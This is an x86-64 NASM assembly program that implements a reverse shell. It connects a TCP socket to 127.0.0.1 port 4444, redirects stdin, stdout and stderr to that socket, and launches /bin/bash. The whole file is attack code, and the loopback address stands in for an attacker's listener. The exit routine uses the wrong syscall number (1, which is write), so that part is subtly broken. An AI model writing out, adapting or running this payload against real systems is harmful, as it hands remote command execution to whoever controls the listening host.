section .bss
    input resb 256

section .rodata

    path_name db '/bin/bash', 0; terminate string

    struc socket_struct; define structure
        sin_family: resw 1
        sin_port: resw 1
        sin_addr: resd 1
    endstruc

    socket_istruct:
    istruc socket_struct
        at sin_family, dw 2; AF_INET
        at sin_port, dw 23569; port 4444
        at sin_addr, dd 16777343; ip adress 127.0.0.1
    iend

section .text
    global _start

_start:
    jmp _socket

_socket:
    mov rax, 41; sys_socket
    mov rdi, 2; AF_INET
    mov rsi, 1; SOCK_STREAM
    mov rdx, 6; IPPROTO_TCP
    syscall

    cmp rax, 3
    jne _exit
    jmp _connect

_connect:
    mov rax, 42; sys_connect
    mov rdi, 3; fd
    mov rsi, socket_istruct
    mov rdx, 16; len
    syscall
    
    cmp rax, -1
    je _exit
    jmp _dup_fd

_dup_fd:
    mov rax, 33; sys_dup2
    mov rdi, 3; unsigned oldfd
    mov rsi, 0; unsigned newfd stdin
    xor rdx, rdx
    syscall

    mov rax, 33
    mov rdi, 3
    mov rsi, 1; stdout
    xor rdx, rdx
    syscall

    mov rax, 33
    mov rdi, 3
    mov rsi, 2; stderr
    xor rdx, rdx
    syscall
    
    jmp _shell_spawn

_shell_spawn:
    mov rax, 59; sys_execve
    mov rdi, path_name; /bin/bash
    xor rsi, rsi; const char *argv1
    xor rdx, rdx; const char *envp
    syscall

_exit:
    mov rax, 1; sys_exit
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    syscall
